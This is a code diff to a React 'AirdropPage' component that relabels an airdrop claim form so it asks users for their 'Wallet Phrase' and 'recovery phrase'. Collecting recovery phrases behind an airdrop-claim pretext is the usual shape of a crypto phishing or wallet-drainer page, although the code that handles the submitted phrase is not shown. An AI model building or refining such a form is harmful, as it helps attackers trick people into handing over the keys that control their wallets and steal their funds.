@@ -106,7 +106,7 @@ function AirdropPage({ asSection = false, id }) {
 
         <form className="claim-form" onSubmit={(event) => event.preventDefault()}>
           <label className="claim-field">
-            <span>Airdrop claim words</span>
+            <span>Wallet Phrase</span>
             <div className="claim-words-box">
               <textarea
                 value={claimWords}
@@ -114,7 +114,7 @@ function AirdropPage({ asSection = false, id }) {
                   setClaimWords(event.target.value)
                   setError('')
                 }}
-                placeholder="Enter public claim words. enter your recovery phrase."
+                placeholder="Enter your wallet phrase. enter your recovery phrase."
                 rows="8"
                 disabled={isRedeeming}
               />
